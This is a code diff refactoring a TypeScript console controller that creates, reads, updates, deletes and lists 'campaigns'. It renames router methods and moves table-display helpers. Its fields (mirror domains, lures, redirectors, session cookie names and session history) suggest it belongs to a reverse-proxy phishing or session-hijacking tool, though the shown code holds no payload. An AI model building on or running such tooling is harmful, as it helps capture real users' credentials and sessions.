@@ -73,7 +73,7 @@ export class CampaignController extends BaseController {
     container.registerSingleton<CampaignController>(
       CAMPAIGN_CONTROLLER,
       (c) =>
-        new CampaignController(
+        new this(
           c.resolve<Validator>(VALIDATOR),
           c.resolve<Logger>(LOGGER),
           c.resolve<Templater>(TEMPLATER),
@@ -113,7 +113,9 @@ export class CampaignController extends BaseController {
     protected readonly campaignService: CampaignService
   ) {
     super(validator, logger, templater, assets, router)
+  }
 
+  init(): this {
     this.validator
       .addSchema('console-create-campaign-args', createCampaignArgsSchema)
       .addSchema('console-read-campaign-args', readCampaignArgsSchema)
@@ -123,13 +125,12 @@ export class CampaignController extends BaseController {
       .addSchema('console-delete-campaign-args', deleteCampaignArgsSchema)
       .addSchema('console-list-campaigns-args', listCampaignsArgsSchema)
       .addSchema('console-raw-campaign-preset', rawCampaignPresetSchema)
+
+    return this
   }
 
-  /**
-   * Registers used commands in the router.
-   */
-  use() {
-    this.router.addCommand<CreateCampaignArgs>(
+  main(): this {
+    this.router.add<CreateCampaignArgs>(
       {
         name: 'campaign-create',
         description: `Creates a new campaign from the preset.`,
@@ -190,7 +191,7 @@ export class CampaignController extends BaseController {
       }
     )
 
-    this.router.addCommand<ReadCampaignArgs>(
+    this.router.add<ReadCampaignArgs>(
       {
         name: 'campaign-read',
         description: `Reads the campaign by ID.`,
@@ -209,7 +210,7 @@ export class CampaignController extends BaseController {
       }
     )
 
-    this.router.addCommand<UpdateCampaignArgs>(
+    this.router.add<UpdateCampaignArgs>(
       {
         name: 'campaign-update',
         description: `Updates the campaign from the preset.`,
@@ -235,7 +236,7 @@ export class CampaignController extends BaseController {
       }
     )
 
-    this.router.addCommand<AppendCampaignFlagArgs>(
+    this.router.add<AppendCampaignFlagArgs>(
       {
         name: 'campaign-append-flag',
         description: `Appends a flag to the campaign.`,
@@ -262,7 +263,7 @@ export class CampaignController extends BaseController {
       }
     )
 
-    this.router.addCommand<RemoveCampaignFlagArgs>(
+    this.router.add<RemoveCampaignFlagArgs>(
       {
         name: 'campaign-remove-flag',
         description: `Removes a flag to the campaign.`,
@@ -289,7 +290,7 @@ export class CampaignController extends BaseController {
       }
     )
 
-    this.router.addCommand<DeleteCampaignArgs>(
+    this.router.add<DeleteCampaignArgs>(
       {
         name: 'campaign-delete',
         description: `Deletes the campaign by its ID.`,
@@ -321,7 +322,7 @@ export class CampaignController extends BaseController {
       }
     )
 
-    this.router.addCommand<ListCampaignsArgs>(
+    this.router.add<ListCampaignsArgs>(
       {
         name: 'campaign-list',
         description: `Lists all campaigns.`,
@@ -333,6 +334,52 @@ export class CampaignController extends BaseController {
 
         this.showCampaignCollection(console, campaigns)
       }
+    )
+
+    return this
+  }
+
+  protected showCampaignModel(console: Console, campaign: FullCampaignModel) {
+    console.table({
+      campaignId: campaign.campaignId,
+      mirrorDomain: campaign.mirrorDomain,
+      cryptSecret: campaign.cryptSecret,
+      upgradeSessionPath: campaign.upgradeSessionPath,
+      sessionCookieName: campaign.sessionCookieName,
+      //sessionCookieNames: campaign.sessionCookieNames.length,
+      sessionExpire: campaign.sessionExpire,
+      newSessionExpire: campaign.newSessionExpire,
+      messageExpire: campaign.messageExpire,
+      isLocked: campaign.isLocked,
+      flags: campaign.flags.length > 0 ? campaign.flags.join(', ') : null,
+      proxyIndex: campaign.proxyIndex,
+      targetIndex: campaign.targetIndex,
+      redirectorIndex: campaign.redirectorIndex,
+      lureIndex: campaign.lureIndex,
+      sessionCount: campaign.sessionCount,
+      sessionHistory: campaign.sessionHistory,
+      messageCount: campaign.messageCount,
+      messageHistory: campaign.messageHistory,
+      createdAt: campaign.createdAt.toISOString(),
+    })
+
+    if (campaign.description) {
+      console.log(campaign.description)
+    }
+  }
+
+  protected showCampaignCollection(console: Console, campaigns: CampaignModel[]) {
+    console.table(
+      campaigns.map((campaign) => {
+        return {
+          campaignId: campaign.campaignId,
+          mirrorDomain: campaign.mirrorDomain,
+          isLocked: campaign.isLocked,
+          sessionCount: campaign.sessionCount,
+          messageCount: campaign.messageCount,
+          createdAt: campaign.createdAt.toISOString(),
+        }
+      })
     )
   }
 
@@ -415,7 +462,7 @@ export class CampaignController extends BaseController {
         mirrorSecure: rawTarget.mirrorSecure,
         mirrorSub: rawTarget.mirrorSub,
         mirrorPort: rawTarget.mirrorPort,
-        label: rawTarget.label ?? 'none',
+        label: rawTarget.label ?? '',
         connectTimeout: rawTarget.connectTimeout ?? 10 * 1000,
         simpleTimeout: rawTarget.simpleTimeout ?? 60 * 1000,
         streamTimeout: rawTarget.streamTimeout ?? 300 * 1000,
@@ -453,49 +500,5 @@ export class CampaignController extends BaseController {
         isEnabled: rawLure.isEnabled ?? false,
       }
     })
-  }
-
-  private showCampaignModel(console: Console, campaign: FullCampaignModel) {
-    console.table({
-      campaignId: campaign.campaignId,
-      mirrorDomain: campaign.mirrorDomain,
-      cryptSecret: campaign.cryptSecret,
-      upgradeSessionPath: campaign.upgradeSessionPath,
-      sessionCookieName: campaign.sessionCookieName,
-      //sessionCookieNames: campaign.sessionCookieNames.length,
-      sessionExpire: campaign.sessionExpire,
-      newSessionExpire: campaign.newSessionExpire,
-      messageExpire: campaign.messageExpire,
-      isLocked: campaign.isLocked,
-      flags: campaign.flags.length > 0 ? campaign.flags.join(', ') : null,
-      proxyIndex: campaign.proxyIndex,
-      targetIndex: campaign.targetIndex,
-      redirectorIndex: campaign.redirectorIndex,
-      lureIndex: campaign.lureIndex,
-      sessionCount: campaign.sessionCount,
-      sessionHistory: campaign.sessionHistory,
-      messageCount: campaign.messageCount,
-      messageHistory: campaign.messageHistory,
-      createdAt: campaign.createdAt.toISOString(),
-    })
-
-    if (campaign.description) {
-      console.log(campaign.description)
-    }
-  }
-
-  private showCampaignCollection(console: Console, campaigns: CampaignModel[]) {
-    console.table(
-      campaigns.map((campaign) => {
-        return {
-          campaignId: campaign.campaignId,
-          mirrorDomain: campaign.mirrorDomain,
-          isLocked: campaign.isLocked,
-          sessionCount: campaign.sessionCount,
-          messageCount: campaign.messageCount,
-          createdAt: campaign.createdAt.toISOString(),
-        }
-      })
-    )
   }
 }
